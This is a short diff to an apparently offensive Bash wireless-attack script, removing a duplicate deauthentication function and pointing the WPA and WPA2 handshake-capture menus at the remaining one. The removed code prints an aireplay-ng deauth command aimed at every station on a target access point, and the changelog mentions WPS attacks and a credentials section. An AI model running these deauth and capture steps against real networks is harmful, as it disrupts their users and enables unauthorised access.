@@ -27,6 +27,7 @@
 ############################################################################
 
 # v1.6
+# - Removed "arAttackDeAuthOnRetry" function. This was a duplicate and now uses "arAttackDeAuth" function instead.
 # - Cleaned up "stopMonitorMode" function.
 # - Added support for bully, used for WPS attacks.
 # - Fixed issue with active network connection not force disconnecting before attacks begin.
@@ -2719,6 +2720,7 @@ menuHoneyPotMode(){
 #   GET CREDENTIALS BEGIN   ################################################
 ############################################################################
 
+
 textGetTargetInfo(){
 
 echo ""
@@ -2775,6 +2777,7 @@ case "$encryptionTypeText" in
 esac
 
 }
+
 
 getESSID(){
 
@@ -4046,25 +4049,6 @@ arAttackDeAuth(){
 }
 
 
-arAttackDeAuthOnRetry(){
-
-	currentTask="arAttackDeAuthOnRetry"
-
-	retryDeauth="0"
-
-	sleepMessage="Preparing to De-Authenticate All Connected Stations...."
-	doSleepMessage
-	sleep 2
-
-	$terminal aireplay-ng --deauth 5 -a $bssid $interfaceMonitor &
-
-	sleepMessage="De-Authenticating All Connected Stations...."
-	doSleepMessage
-	sleep 5
-
-}
-
-
 arAttackDeAuthConstant(){
 
 	currentTask="arAttackDeAuthConstant"
@@ -4312,7 +4296,7 @@ menuAttacksWPA(){
 		sleepMessage="Preparing to De-Authenticate All Connected Stations...."
 		doSleepMessage
 		sleep 1
-		arAttackDeAuthOnRetry
+		arAttackDeAuth
 		captureHandshakeWPA
 		;;
 	esac
@@ -4748,7 +4732,7 @@ menuAttacksWPA2(){
 		sleepMessage="Preparing to De-Authenticate All Connected Stations...."
 		doSleepMessage
 		sleep 1
-		arAttackDeAuthOnRetry
+		arAttackDeAuth
 		captureHandshakeWPA2
 		;;
 	esac
